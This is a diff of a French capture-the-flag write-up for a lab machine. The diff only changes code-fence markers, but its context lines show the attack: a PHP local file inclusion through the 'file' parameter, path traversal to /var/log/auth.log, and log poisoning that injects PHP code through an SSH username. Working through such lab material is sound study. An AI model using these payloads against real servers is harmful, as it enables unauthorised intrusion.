@@ -15,7 +15,7 @@ L'objectif de la mission est de trouver s'ils dissimulent quelque chose.
 Un scan et une première faille
 ------------------------------
 
-```plain
+```
 Nmap scan report for 192.168.1.10
 Host is up (0.0058s latency).
 Not shown: 65533 closed ports
@@ -42,7 +42,7 @@ Sur le site web qui est le site de l'entreprise on note une adresse email *weare
 
 Un scan [Wapiti 3.0.0](http://wapiti.sourceforge.net/) nous remonte une anomalie pour le fichier *index.php*. Le bug aurait aussi pu être trouvé à la mano puisque c'est le seul script qui prend un argument sur le site.  
 
-```plain
+```
 curl -D- "http://192.168.1.10/?file=index.php"
 HTTP/1.0 500 Internal Server Error
 Date: Wed, 29 Nov 2017 22:02:38 GMT
@@ -56,7 +56,7 @@ Les liens présents sur le site passent les fichiers *research.php* et *about.ph
 
 Un petit coup de buster permet de confirmer que ces fichiers sont dans le même dossier, à la racine :  
 
-```plain
+```
 http://192.168.1.10/about.php - HTTP 200 (1252 bytes, gzip)
 http://192.168.1.10/index.php - HTTP 200 (1312 bytes, gzip)
 http://192.168.1.10/research.php - HTTP 200 (3287 bytes, gzip)
@@ -64,19 +64,19 @@ http://192.168.1.10/research.php - HTTP 200 (3287 bytes, gzip)
 
 En jouant un peu avec cette vulnérabilité d'inclusion PHP (vraisemblablement d'après l'erreur 500) on se rend compte que l'on peut inclure un path relatif:  
 
-```plain
+```
 192.168.1.10/index.php?file=layout/styles/layout.css
 ```
 
 on peut aussi remonter dans l'arborescence :  
 
-```plain
+```
 192.168.1.10/index.php?file=images/../layout/styles/layout.css
 ```
 
 on peut aussi faire référence au dossier local  
 
-```plain
+```
 http://192.168.1.10/index.php?file=./layout/styles/layout.css
 ```
 
@@ -84,7 +84,7 @@ pourtant en passant des paths [de fichiers bien connus](https://github.com/tennc
 
 Ma première idée a été de brute-forcer le nom du répertoire courant qui pourrait me donner d'autres idées par la suite :  
 
-```plain
+```
 import sys
 
 import requests
@@ -105,7 +105,7 @@ with open(sys.argv[1], errors="ignore") as fd:
 
 Je fini ainsi par trouver que le répertoire courant se nomme *public\_html*, ainsi on retrouve bien le contenu de la page about avec l'URL suivante :  
 
-```plain
+```
 http://192.168.1.10/?file=../public_html/about.php
 ```
 
@@ -118,7 +118,7 @@ Que la lumière soit
 
 Décu mais pas désemparé j'ai testé d'inclure d'autres fichiers du système et j'obtiens finalement un résultat intéressant avec *auth.log* :  
 
-```plain
+```
 http://192.168.1.10/?file=../../../../../../../../../../../../var/log/auth.log
 ```
 
@@ -126,7 +126,7 @@ Ce fichier de log enregistre les infos d'ouverture de session, sudo et aussi les
 
 La seule (légère) difficulté consiste alors à injecter du code PHP dans ce fichier de log. Cela se fait facilement en spécifiant un utilisateur très particulier à SSH :)  
 
-```plain
+```
 ssh -l '<?php phpinfo() ?>' 192.168.1.10
 ```
 
@@ -136,7 +136,7 @@ Pas dans un dossier utilisateur donc mais le répertoire d'au dessus contenait b
 
 Il y a les fichiers suivants dans le dossier :  
 
-```plain
+```
 total 11336
 drwxrwxr-x 4 root     www-data        4096 Jan 14 06:51 .
 drwxr-xr-x 5 root     root            4096 Oct 23 18:31 ..
@@ -258,7 +258,7 @@ Une recherche sur l'ensemble du système pour trouver des fichiers dont le nom c
 
 Un strings sur le fichier *flag.png* montre une chaîne base64 rajoutée en fin de fichier.  
 
-```plain
+```
 root@theEther:/home/evilscience# strings /root/flag.png | grep flag | cut -d' ' -f2 | base64 -d
 october 1, 2017.
 We have or first batch of volunteers for the genome project. The group looks promising, we have high hopes for this!
@@ -295,7 +295,7 @@ Game over
 
 Un peu déçu par ce challenge qui certes propose des cas qui changent un peu mais qui est au final peu réaliste, comme par exemple les permissions sur *auth.log* qui sont loin de ce que l'on peut trouver dans la réalité :  
 
-```plain
+```
 -rw-r----- 1 syslog adm /var/log/auth.log
 ```
 
